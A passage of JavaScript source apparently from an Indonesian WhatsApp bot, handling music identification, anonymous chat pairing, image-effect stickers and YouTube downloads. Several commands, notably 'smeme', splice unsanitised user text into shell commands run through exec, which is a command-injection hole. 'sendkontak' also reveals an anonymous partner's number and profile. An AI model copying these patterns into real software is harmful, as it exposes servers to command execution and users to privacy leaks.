let teks = `
*RESULT FOUND* 💽

📂 Title: ${res.title}
👤 Artist: ${res.artists !== undefined ? res.artists.map(v => v.name).join(', ') : ''}
💾 Album: ${res.album.name || ''}
🧩 Genres: ${res.genres !== undefined ? res.genres.map(v => v.name).join(', ') : ''}
🌏 Release Date: ${res.release_date}
⏳ Durasi : ${ras[0].timestamp}
🎧 Audio : ${FileSize(audio[0].contentLength)}
🎬 Video : ${FileSize(format.contentLength)}
`
sendButLocation(from, teks, `© ${fake1}`, yamyam, aklo, {contextInfo: forward})
});
fs.unlinkSync(ran)
})
} else if (isQuotedVideo) {
setReply(mess.wait)
encmedia = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
media = await xdev.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} -vn ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return setReply(`Err: ${err}`)
sample = fs.readFileSync(ran)
acr.identify(sample).then(async metadata => {
if(metadata.status.msg == 'No result') return setReply("Music tidak di temukan")
var res = metadata.metadata.music[0]
rus = await yts(res.title)
if(rus.all.length == "0") return setReply("Video tidak bisa di download")
ras = await rus.all.filter(v => v.type == 'video')
let info = await ytdl.getInfo(ras[0].url);
let audio = ytdl.filterFormats(info.formats, 'audioonly');
let format = ytdl.chooseFormat(info.formats, { quality: '18' });
let videoID = ras[0].videoId

try{
var thumbnya =`https://i.ytimg.com/vi/${videoID}/mqdefault.jpg`
} catch(err) {
var thumbnya =`https://i.ytimg.com/vi/${videoID}/sqdefault.jpg`
}
yamyam = await getBuffer(`${thumbnya}`)
let aklo = [
{"buttonId": `${prefix}playmp3 ${ras[0].url} `,"buttonText": {"displayText": `ᴀᴜᴅɪᴏ`},"type": "RESPONSE"},
{"buttonId": `${prefix}playmp4 ${ras[0].url}`,"buttonText": {"displayText": `ᴠɪᴅɪᴏ`},"type": "RESPONSE"}
]

let teks = `
*RESULT FOUND* 💽

📂 Title: ${res.title}
👤 Artist: ${res.artists !== undefined ? res.artists.map(v => v.name).join(', ') : ''}
💾 Album: ${res.album.name || ''}
🧩 Genres: ${res.genres !== undefined ? res.genres.map(v => v.name).join(', ') : ''}
🌏 Release Date: ${res.release_date}
⏳ Durasi : ${ras[0].timestamp}
🎧 Audio : ${FileSize(audio[0].contentLength)}
🎬 Video : ${FileSize(format.contentLength)}
`
sendButLocation(from, teks, `© ${fake1}`, yamyam, aklo, {contextInfo: forward})
});
fs.unlinkSync(ran)
 })
 } else {
setReply("Reply audio atau video")
}
break

	
		
case 'sendkontak': case 'sendcontact': {
if (isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
this.anonymous = this.anonymous ? this.anonymous : {}
let room = Object.values(this.anonymous).find(room => room.check(m.sender))
if (!room) {
let buttons = [
{ buttonId:`${prefix}start`, buttonText: { displayText: 'Start' }, type: 1 }
                    ]
teks = `Kamu Sedang Tidak Berada Di Sesi Anonymous, Tekan Button Untuk Mencari Partner`
await sendButLocation(from, teks, `Baterai : ${baterai.battery}\n© ${fake1}`, fs.readFileSync('./stik/thumb.jpeg'), buttons, {contextInfo: forward})
} else {

try {
var ppimg = await xdev.getProfilePicture(room.b)
} catch {
var ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}

let mok = [
{ buttonId:`${prefix}stop`, buttonText: { displayText: 'stop' }, type: 1 }
 ]

foto = await getBuffer(ppimg)
stst = await xdev.getStatus(`${room.b.split("@")[0]}@c.us`)
stst = stst.status == 401 ? '' : stst.status
yahu = xdev.contacts[room.b] != undefined ? xdev.contacts[room.b].notify = undefined ? PhoneNumber('+' + room.b.replace('@s.whatsapp.net', '')).getNumber('international') : xdev.contacts[room.b].notify || xdev.contacts[room.b].vname : PhoneNumber('+' + room.b.replace('@s.whatsapp.net', '')).getNumber('international')
menunya = `
Nama : ${yahu}
Bio : ${stst}
User : wa.me/${room.b.split("@")[0]}`
sendButLocation(room.a, menunya, `Baterai : ${baterai.battery}\n© ${fake1}`, foto, mok, {contextInfo: forward})
sendKontak(room.a, room.b.split("@")[0], yahu, stst);
}
}
break
	
	
case 'anonymous': 
if (isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
buttons = [
{ buttonId: `${prefix}start`, buttonText: { displayText: `sᴛᴀʀᴛ` }, type: 1 },
{ buttonId: `${prefix}me`, buttonText: { displayText: `ᴘʀᴏғɪʟᴇ` }, type: 1 }
 ]
teks = `Hai ${pushname} selat datang di Anonymous Chat\n\nKlik button dibawah ini untuk memcari partner`
sendButLocation(from, teks, `Baterai : ${baterai.battery}\n© ${fake1}`, fs.readFileSync('./stik/anonymous.jpg'), buttons, {contextInfo: forward})                   
break
			
	
case 'mulai': case 'start': {
if (isGroup) return setReply(mess.only.group)
this.anonymous = this.anonymous ? this.anonymous : {}
let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
if (Object.values(this.anonymous).find(room => room.check(m.sender))) {
let buttons = [
{ buttonId: `${prefix}keluar`, buttonText: { displayText: `sᴛᴏᴘ`}, type: 1 },
{ buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ` }, type: 1 }
                    ]
teks = `Kamu Masih Berada Di dalam Sesi Anonymous, Tekan Button Dibawah Ini Untuk Menghentikan Sesi Anonymous Anda`
sendButLocation(from, teks, `Baterai : ${baterai.battery}\n© ${fake1}`, fs.readFileSync('./stik/anonymous.jpg'), buttons, {contextInfo: forward})
} else               
if (room) {
let buttons = [
{ buttonId: `${prefix}next`, buttonText: { displayText: `sᴋɪᴘ` }, type: 1 },
{ buttonId: `${prefix}keluar`, buttonText: { displayText: `sᴛᴏᴘ` }, type: 1 }
                    ]
teks =`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan`
await sendButLocation(room.a, teks, `Baterai : ${baterai.battery}\n© ${fake1}`, fs.readFileSync('./stik/anonymous.jpg'), buttons, {contextInfo: forward})                                        
room.b = m.sender
room.state = 'CHATTING'
await sendButLocation(room.b, teks, `Baterai : ${baterai.battery}\n© ${fake1}`, fs.readFileSync('./stik/anonymous.jpg'), buttons, {contextInfo: forward})                               
} else {
let id = + new Date
this.anonymous[id] = {
id,
a: m.sender,
b: '',
state: 'WAITING',
check: function (who = '') {
return [this.a, this.b].includes(who)
},
other: function (who = '') {
return who === this.a ? this.b : who === this.b ? this.a : ''
},
}
let buttons = [
{ buttonId: `${prefix}keluar`, buttonText: { displayText: `sᴛᴏᴘ` }, type: 1 },
{ buttonId: `${prefix}me`, buttonText: { displayText: `ᴘʀᴏғɪʟᴇ` }, type: 1 }
                    ]
teks1 = `Mohon Tunggu Sedang Mencari Partner`
await sendButLocation(from, teks1, `Baterai : ${baterai.battery}\n© ${fake1}`, fs.readFileSync('./stik/anonymous.jpg'), buttons, {contextInfo: forward})                               
}
break
}
            
  
case 'keluar': case 'stop': {
if (m.isGroup) return setReply('Fitur Tidak Dapat Digunakan Untuk Group!')
this.anonymous = this.anonymous ? this.anonymous : {}
let room = Object.values(this.anonymous).find(room => room.check(m.sender))
if (!room) {
let buttons = [
{ buttonId: `${prefix}start`, buttonText: { displayText: 'Start' }, type: 1 }
                    ]
teks = `Kamu Sedang Tidak Berada Di Sesi Anonymous, Tekan Button Untuk Mencari Partner `
sendButLocation(from, teks, `Baterai : ${baterai.battery}\n© ${fake1}`, fs.readFileSync('./stik/anonymous.jpg'), buttons, {contextInfo: forward})             
} else {
setReply('Kamu telah berhenti dari Anonymus Chat')
let other = room.other(m.sender)       
let buttons = [
{ buttonId: `${prefix}next`, buttonText: { displayText: 'next' }, type: 1 }
                    ]
if (other) await sendButLocation(other, `Partner Telah Meninggalkan Sesi Anonymous`, `Baterai : ${baterai.battery}\n© ${fake1}`, fs.readFileSync('./stik/anonymous.jpg'), buttons, {contextInfo: forward})
delete this.anonymous[room.id]
}
}
break
            
   
         
case 'next': case 'lanjut': {
if (isGroup) return setReply('Fitur Tidak Dapat Digunakan Untuk Group!')
this.anonymous = this.anonymous ? this.anonymous : {}
let romeo = Object.values(this.anonymous).find(room => room.check(m.sender))

if (!romeo) {
let buttons = [
{ buttonId: `${prefix}start`, buttonText: { displayText: 'Start' }, type: 1 }
                    ]
teks =`Kamu Sedang Tidak Berada Di Sesi Anonymous, Tekan Button Untuk Mencari Partner`
return sendButLocation(from, teks, `Baterai : ${baterai.battery}\n© ${fake1}`, fs.readFileSync('./stik/anonymous.jpg'), buttons, {contextInfo: forward})                                         

} 
let other = romeo.other(m.sender)
if (other) await xdev.sendMessage(other, `Partner Telah Meninggalkan Sesi Anonymous`, text)
delete this.anonymous[romeo.id]

let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
if (room) {
let buttons = [
{ buttonId: `${prefix}next`, buttonText: { displayText: 'Skip' }, type: 1 },
{ buttonId: `${prefix}keluar`, buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
teks =`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan`
await sendButLocation(room.a, teks, `Baterai : ${baterai.battery}\n© ${fake1}`, fs.readFileSync('./stik/anonymous.jpg'), buttons, {contextInfo: forward})              
room.b = m.sender
room.state = 'CHATTING'
await sendButLocation(room.b, teks, `Baterai : ${baterai.battery}\n© ${fake1}`, fs.readFileSync('./stik/anonymous.jpg'), buttons, {contextInfo: forward})              
} else {
let id = + new Date
this.anonymous[id] = {
id,
a: m.sender,
b: '',
state: 'WAITING',
check: function (who = '') {
return [this.a, this.b].includes(who)
},
other: function (who = '') {
return who === this.a ? this.b : who === this.b ? this.a : ''
},
}
let buttons = [
{ buttonId: `${prefix}stop`, buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
teks =`Mohon Tunggu Sedang Mencari Partner`
await sendButLocation(from, teks, `Baterai : ${baterai.battery}\n© ${fake1}`, fs.readFileSync('./stik/anonymous.jpg'), buttons, {contextInfo: forward})              
}
break
}
         
             
	
case 'suitpvp': case 'suit': {
this.suit = this.suit ? this.suit : {}
let poin = 10
let poin_lose = 10
let timeout = 60000
if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) m.reply(`Selesaikan suit mu yang sebelumnya`)
if (!m.mentionedJid[0]) return xdev.sendMessage(from, `_Siapa yang ingin kamu tantang?_\nTag orangnya..\n\nContoh : ${prefix}suit @${ownerNumber[0].split("@")[0]}`, text, { mentionedJid: [`${ownerNumber[0]}`] })
if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) return setReply( `Orang yang kamu tantang sedang bermain suit bersama orang lain :(`)
let id = 'suit_' + new Date() * 1
let caption = `_*SUIT PvP*_

@${m.sender.split`@`[0]} menantang @${m.mentionedJid[0].split`@`[0]} untuk bermain suit

Silahkan @${m.mentionedJid[0].split`@`[0]} untuk ketik terima/tolak`
this.suit[id] = {      
chat: await mentions(caption, parseMention(caption), true),
id: id,
p: m.sender,
p2: m.mentionedJid[0],
status: 'wait',
waktu: setTimeout(() => {
if (this.suit[id]) xdev.sendMessage(from, `_Waktu suit habis_`, text)            
delete this.suit[id]
}, 60000), poin, poin_lose, timeout
}
}
break
	
	
	
case 'triggered':
case 'wasted':
case 'comrade':
case 'horny':
case 'blur':
case 'pixelate':
case 'simpcard':
case 'lolice':
case 'glass':
if ((isMedia && !dev.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev 
setReply(mess.wait)
owgi = await xdev.downloadMediaMessage(ger)
anu = await upload(owgi)
ranp = getRandom('.gif')
rano = getRandom('.webp')
anu4 = `https://some-random-api.ml/canvas/${command}?avatar=${anu}`
exec(`wget ${anu4} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
fs.unlinkSync(ranp)
if (err) return setReply(`${err}`)
xdev.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: dev})
fs.unlinkSync(rano)
})
} else if (isQuotedTag || isQuotedReply) {
setReply(mess.wait)
ghost = dev.message.extendedTextMessage.contextInfo.participant || dev.message.extendedTextMessage.contextInfo.mentionedJid[0]
oppp = await xdev.getProfilePicture(ghost).catch(_ => 'https://telegra.ph/file/24fa902ead26340f3df2c.png')
datae = await imageToBase64(JSON.stringify(oppp).replace(/\"/gi, ''))
fs.writeFileSync('janckuk.jpeg', datae, 'base64')
anu = await upload(fs.readFileSync('./janckuk.jpeg'))
ranp = getRandom('.gif')
rano = getRandom('.webp')
anu4 = `https://some-random-api.ml/canvas/${command}?avatar=${anu}`
exec(`wget ${anu4} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
fs.unlinkSync(ranp)
if (err) return setReply(`${err}`)
xdev.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: dev})
fs.unlinkSync(rano)
})
} else {
setReply('Gunakan foto!')
}
break 




case '3000years':
case 'approved':
case 'wanted':
case 'utatoo':
case 'unsharpen':
case 'thanos':
case 'sniper':
case 'sharpen':
case 'sepia':
case 'scary':
case 'rip':
case 'redple':
case 'rejected':
case 'posterize':
case 'ps4':
case 'pixelize':
case 'missionpassed':
case 'moustache':
case 'lookwhatkarenhave':
case 'jail':
case 'invert':
case 'instagram':
case 'greyscale':
case 'glitch':
case 'gay':
case 'frame':
case 'fire':
case 'distort':
case 'dictator':
case 'deepfry':
case 'ddungeon':
case 'circle':
case 'challenger':
case 'burn':
case 'brazzers':
case 'beautiful':
if (isQuotedImage) {
setReply(mess.wait)
 encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
 ahah = await xdev.downloadMediaMessage(encmedia)
ranp = getRandom('.jpg')
//ahah = await xdev.downloadMediaMessage(ger)
fs.writeFileSync(`./${ranp}`, ahah);
owgi = await upload(fs.readFileSync(ranp))
ini_gen = `${command}`
ameApi.generate(ini_gen, { url : owgi}).then(gambar => {
xdev.sendMessage(from, gambar, image, {quoted: dev, caption: "Nih"})
fs.unlinkSync(ranp)
}).catch(err => {
setReply(`${err}`)
});  
} else if (isQuotedTag || isQuotedReply) {
setReply(mess.wait)
ghost = dev.message.extendedTextMessage.contextInfo.participant || dev.message.extendedTextMessage.contextInfo.mentionedJid[0]
oppp = await xdev.getProfilePicture(ghost).catch(_ => 'https://telegra.ph/file/24fa902ead26340f3df2c.png')
datae = await imageToBase64(JSON.stringify(oppp).replace(/\"/gi, ''))
fs.writeFileSync('janckuk.jpeg', datae, 'base64')
anuk = await upload(fs.readFileSync('./janckuk.jpeg'))
ini_gen = `${command}`
console.log(color(ini_gen))
ameApi.generate(ini_gen, {
url : anuk
}).then(gambar => {
xdev.sendMessage(from, gambar, image, {quoted: dev, caption: "Nih"})
fs.unlinkSync('./janckuk.jpeg')
}).catch(err => {
setReply(`${err}`)
});    
} else {
setReply("Tag atau Reply targetnya")
}
break
            
     

			

      
    
case 'smeme': case 'stickmeme': case 'sm': 
if(!q) return setReply(`Masukan teks, contoh : ${prefix}smeme teks|teks`)
var top = q.split('|')[0] ? q.split('|')[0] : ''
var bottom = q.split('|')[1] ? q.split('|')[1] : ''           
if ((isMedia && !dev.message.videoMessage || isQuotedImage ) && args.length >= 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev 
setReply(mess.wait)
olalah = await xdev.downloadMediaMessage(ger)
anuah = await upload(olalah)
ranp = getRandom('.gif')
rano = getRandom('.webp')
anu2 = `https://api.memegen.link/images/custom/${top}/${bottom}.png?background=${anuah}`
exec(`wget ${anu2} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
fs.unlinkSync(ranp)
if (err) return setReply(`${err}`)
xdev.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: dev})
fs.unlinkSync(rano)
})
} else {
setReply('Gunakan foto!')
}
break    
    
    
	

	


 
case 'tomp4':
case 'tovideo':
if ((isMedia && !dev.message.videoMessage || isQuotedSticker) && !q) {
setReply(mess.wait)
ger = isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev 
file = await  xdev.downloadAndSaveMediaMessage(ger)
outGif = `./temp/${getRandom('.gif')}`
outMp4 = `./temp/${getRandom('.mp4')}`
status = false
//convert webp ke gif pakai imagemagick
exec(`convert ${file} ${outGif}`, (err) => {
if (err) {
console.log(err)
return setReply(`${err}`)
}

//lalu convert gif ke mp4 pakai ffmpeg
exec(`ffmpeg -i ${outGif} -vf "crop=trunc(iw/2)*2:trunc(ih/2)*2" -b:v 0 -crf 25 -f mp4 -vcodec libx264 -pix_fmt yuv420p ${outMp4}`, (err) => {
if (err) {
console.log(err)
return setReply(`${err}`)
 }      
sendVideo(fs.readFileSync(outMp4))
status = true
 if(status){
 fs.unlinkSync(outGif)
 fs.unlinkSync(outMp4)
 fs.unlinkSync(file)
 status = false
 }
    })
}) 

}
break
	
	
case 'togif':
if ((isMedia && !dev.message.videoMessage || isQuotedSticker) && !q) {
setReply(mess.wait)
ger = isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev 
file = await  xdev.downloadAndSaveMediaMessage(ger)
outGif = `./temp/${getRandom('.gif')}`
outMp4 = `./temp/${getRandom('.mp4')}`
status = false
//convert webp ke gif pakai imagemagick
exec(`convert ${file} ${outGif}`, (err) => {
if (err) {
console.log(err)
return setReply(`${err}`)
}

//lalu convert gif ke mp4 pakai ffmpeg
exec(`ffmpeg -i ${outGif} -vf "crop=trunc(iw/2)*2:trunc(ih/2)*2" -b:v 0 -crf 25 -f mp4 -vcodec libx264 -pix_fmt yuv420p ${outMp4}`, (err) => {
if (err) {
console.log(err)
return setReply(`${err}`)
 }      
sendGif(fs.readFileSync(outMp4))
status = true
 if(status){
 fs.unlinkSync(outGif)
 fs.unlinkSync(outMp4)
 fs.unlinkSync(file)
 status = false
 }
    })
}) 

} else if(isQuotedVideo){
setReply(mess.wait)
ger = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev 
outMp4 = `${getRandom('.mp4')}`
file = await xdev.downloadMediaMessage(ger);
fs.writeFileSync(`./${outMp4}`, file);
sendGif(fs.readFileSync(outMp4))
fs.unlinkSync(`./${outMp4}`)
}
break
	
	
	
	
	
	
	
	case 'blackping':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/create-blackpink-logo-style-online-1001.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: dev, caption: "Nih"}))
  .catch((err) => console.log(err));
   break
	
	case 'glitch':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/create-impressive-glitch-text-effects-online-1027.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: dev, caption: "Nih"}))
  .catch((err) => console.log(err));
   break
	
	
	
	case 'glitch2':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks|teks`)
	setReply(mess.wait)
	teks1 = q.split("|")[0]
	teks2 = q.split("|")[1]
	textpro("https://textpro.me/create-a-glitch-text-effect-online-free-1026.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => sendFileFromUrl(data, image, {quoted: dev, caption: "Nih"}))
  .catch((err) => console.log(err));
   break
	
	
	
	
	case 'glitch3':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks|teks`)
	setReply(mess.wait)
	teks1 = q.split("|")[0]
	teks2 = q.split("|")[1]
	textpro("https://textpro.me/create-glitch-text-effect-style-tik-tok-983.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => sendFileFromUrl(data, image, {quoted: dev, caption: "Nih"}))
  .catch((err) => console.log(err));
   break
	
	
	
	
	
	case '3dspace':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks|teks`)
	setReply(mess.wait)
	teks1 = q.split("|")[0]
	teks2 = q.split("|")[1]
	textpro("https://textpro.me/create-space-3d-text-effect-online-985.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => sendFileFromUrl(data, image, {quoted: dev, caption: "Nih"}))
  .catch((err) => console.log(err));
   break
	
	
	
	case 'lion':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks|teks`)
	setReply(mess.wait)
	teks1 = q.split("|")[0]
	teks2 = q.split("|")[1]
	textpro("https://textpro.me/create-lion-logo-mascot-online-938.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => sendFileFromUrl(data, image, {quoted: dev, caption: "Nih"}))
  .catch((err) => console.log(err));
   break
	
	
	
	
	case '3dneon':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/create-3d-neon-light-text-effect-online-1028.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: dev, caption: "Nih"}))
  .catch((err) => console.log(err));
   break
	
	
	
	
	
	case 'neon':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/neon-text-effect-online-879.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: dev, caption: "Nih"}))
  .catch((err) => console.log(err));
   break
	
	
	
	case 'greenneon':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/green-neon-text-effect-874.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: dev, caption: "Nih"}))
  .catch((err) => console.log(err));
   break
   
   
   
   
   case 'bokeh':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/bokeh-text-effect-876.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: dev, caption: "Nih"}))
  .catch((err) => console.log(err));
   break
   
   
	
	
	case 'hollographic':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/holographic-3d-text-effect-975.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: dev, caption: "Nih"}))
  .catch((err) => console.log(err));
   break
	
	
	
	case 'bear':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	teks1 = q.split("|")[0]
	teks2 = q.split("|")[1]
	textpro("https://textpro.me/online-black-and-white-bear-mascot-logo-creation-1012.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => sendFileFromUrl(data, image, {quoted: dev, caption: "Nih"}))
  .catch((err) => console.log(err));
   break
	
	
	
	
	
	
	case 'wolf':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	teks1 = q.split("|")[0]
	teks2 = q.split("|")[1]
	textpro("https://textpro.me/create-wolf-logo-galaxy-online-936.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => sendFileFromUrl(data, image, {quoted: dev, caption: "Nih"}))
  .catch((err) => console.log(err));
   break
	
	
	
	
	
	
	
case 'yts':
 try {
  if (!q) return setReply('Format salah')
setReply('Tunggu sebentar')
 rus = await yts(q)
 res = await rus.all.filter(v => v.type == 'video')
 let videoID = res[0].videoId

try{
var thumbnya =`https://i.ytimg.com/vi/${videoID}/mqdefault.jpg`
} catch(err) {
var thumbnya =`https://i.ytimg.com/vi/${videoID}/sqdefault.jpg`
}
 a = `*Youtube Search 🔎*\n`
for (let i of res) {
a += `
📜 Title : ${i.title}
📈 Views : ${i.views}
🌐 Upload : ${i.ago}
⏱️ Durasi : ${i.timestamp}
🎥 Channel : ${i.author.name}
🖇️ Link : ${i.url}\n\n`
}
b = a.trim()

imag = await getBuffer(res[0].image)
let mok = [{"buttonId": `${prefix}playmp3 ${res[0].url} `,"buttonText": {"displayText": `ᴀᴜᴅɪᴏ`},"type": "RESPONSE"},
                    {"buttonId": `${prefix}playmp4 ${res[0].url}`,"buttonText": {"displayText": `ᴠɪᴅᴇᴏ`},"type": "RESPONSE"}]
sendButLocation(from, b, `Baterai : ${baterai.battery}\n© ${fake1}`, imag, mok, {contextInfo: forward})

 } catch (e) {
 console.log(e)
 setReply(`${e}`)
}
break
	
	
	
	
	
	
case 'play':{
if(!q) return setReply("Teksnya mana om")
setReply(mess.wait)
rus = await yts(q)
if(rus.all.length == "0") return setReply("Video tidak bisa di download")
data = await rus.all.filter(v => v.type == 'video')


try{
var res = data[0]
var info = await ytdl.getInfo(res.url);
console.log(info)
} catch{
var res = data[1]
var info = await ytdl.getInfo(res.url);
}


let audio = ytdl.filterFormats(info.formats, 'audioonly');
let format = ytdl.chooseFormat(info.formats, { quality: '18' });


try{
var thumbnya =`https://i.ytimg.com/vi/${res.videoId}/mqdefault.jpg`
} catch(err) {
var thumbnya =`https://i.ytimg.com/vi/${res.videoId}/sqdefault.jpg`
}


inithumb = await getBuffer(thumbnya)
options1 = {contextInfo: { forward, externalAdReply:{title:`${ucapanWaktu} ${pushname}`,body:`*click here to play music`,mediaType:"2",thumbnail: inithumb, mediaUrl: res.url}}}
teks =`
📂 Judul : ${res.title}
🌐 Ditonton : ${h2k(res.views)} Kali
⏳ Durasi : ${res.timestamp}
👤 Channel : ${res.author.name}
🎧 Audio : ${FileSize(audio[0].contentLength)}
🎬 Video : ${FileSize(format.contentLength)}`

yamyam = await getBuffer(`${thumbnya}`)
let aklo = [
{"buttonId": `${prefix}playmp3 ${res.url} `,"buttonText": {"displayText": `ᴀᴜᴅɪᴏ`},"type": "RESPONSE"},
{"buttonId": `${prefix}playmp4 ${res.url}`,"buttonText": {"displayText": `ᴠɪᴅɪᴏ`},"type": "RESPONSE"}
]

if(setmenu === "document") {
Sendbutdocument(from, `*YOUTUBE DOWNLOADER*\n${teks}`, `© ${fake1}`, fs.readFileSync('./stik/thumbnaildokumen.jpg'), aklo, options1)
} else {
sendButLocation(from,`*YOUTUBE DOWNLOADER*📥\n${teks}`, `© ${fake1}`, yamyam, aklo, {contextInfo: forward})
}
}
break
	 
	
	
case 'playmp3':{
if(!isUrl) return setReply("Masukan link")
let info = await ytdl.getInfo(q);
let audioFormats = ytdl.filterFormats(info.formats, 'audioonly');
console.log(audioFormats)
try{
low = audioFormats[2].contentLength
} catch (err){
low = audioFormats[0].contentLength
}
if(Number(low) > 15000000 ) return setReply(`Bjir sizenya ${FileSize(low)}\nAu ah ga mao download 😤`)
setReply("*Downloading...*")
downloadMp3(q) 
//sendFileFromUrl (audioFormats[0].url, audio, {quoted: dev}) 
}
break
	
case 'playmp4':{
if(!isUrl) return setReply("Masukan link")
let info = await ytdl.getInfo(q);
let format = ytdl.chooseFormat(info.formats, { quality: '18' });
if(Number(format.contentLength) > 40000000 ) return setReply(`Bjir sizenya ${FileSize(format.contentLength)}\nAu ah ga mao download 😤`)
setReply("*Downloading...*")
downloadMp4 (q) 
//sendMediaURL (from, format.url, "Nih")
}
break


	
	
case 'ytmp3':
try{
if(!q) return setReply("Masukan link youtube")
 if (q.includes("https://youtube.com/channel/")) return setReply("Goblok itu bukan link vidio bangsat")
if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return setReply(mess.limit)
if(!isUrl(q)) return setReply("Masukan link")
setReply("*Scrapping...*")
let isLinks = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
if(q.includes("https://youtu.be/")){
var videoId = q.replace('https://youtu.be/', '')
} else if(q.includes("https://youtube.com/watch?v=")){
var videoId = q.split('=')[1]
} else if(q.includes("https://youtube.com/shorts/")){
var videoId = q.replace('https://youtube.com/shorts/', '')
}  else {
return setReply("Link salah")
}

 let link =`https://youtube.com/watch?v=${videoId}`
 
let anu = await yts(link)
let info = await ytdl.getInfo(link);
let format = ytdl.filterFormats(info.formats, 'audioonly');
if(Number(format.contentLength) > 20000000 ) return setReply(`Bjir sizenya ${FileSize(format.contentLength)}\nAu ah ga mao download 😤`)

teks =`*YOUTUBE AUDIO DOWNLOADER*

📂 Title : ${info.videoDetails.title}
📄 Size : ${FileSize(format[0].contentLength)}
🆔 ID : ${videoId}
⏲️ Duration : ${anu.all[0].timestamp}
📊 Viewers : ${h2k(anu.all[0].views)}
🌐 Upload At : ${anu.all[0].ago}
🔖 Author : ${anu.all[0].author.name}
?? Channel : ${anu.all[0].author.url}
🔗 Url : ${anu.all[0].url}
📝 Description : ${anu.all[0].description}`

sendFileFromUrl(anu.all[0].image, image, {quoted: dev, caption: teks})
//sendMediaURL (from, format[0].url, "Nih")
downloadMp3(q) 
limitAdd(senderNumber, user)
  } catch(err){
  console.log(err)
setReply(`${err}`)
}
break
	
	
	
	case 'ytmp4':
                 try{
 if (q.includes("https://youtube.com/channel/")) return setReply("Goblok itu bukan link vidio bangsat")
if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return setReply(mess.limit)
if(!isUrl) return setReply("Masukan link")
setReply("*Scrapping...*")

if(q.includes("https://youtu.be/")){
var videoId = q.replace('https://youtu.be/', '')
} else if(q.includes("https://youtube.com/watch?v=")){
var videoId = q.split('=')[1]
} else if(q.includes("https://youtube.com/shorts/")){
var videoId = q.replace('https://youtube.com/shorts/', '')
}  else {
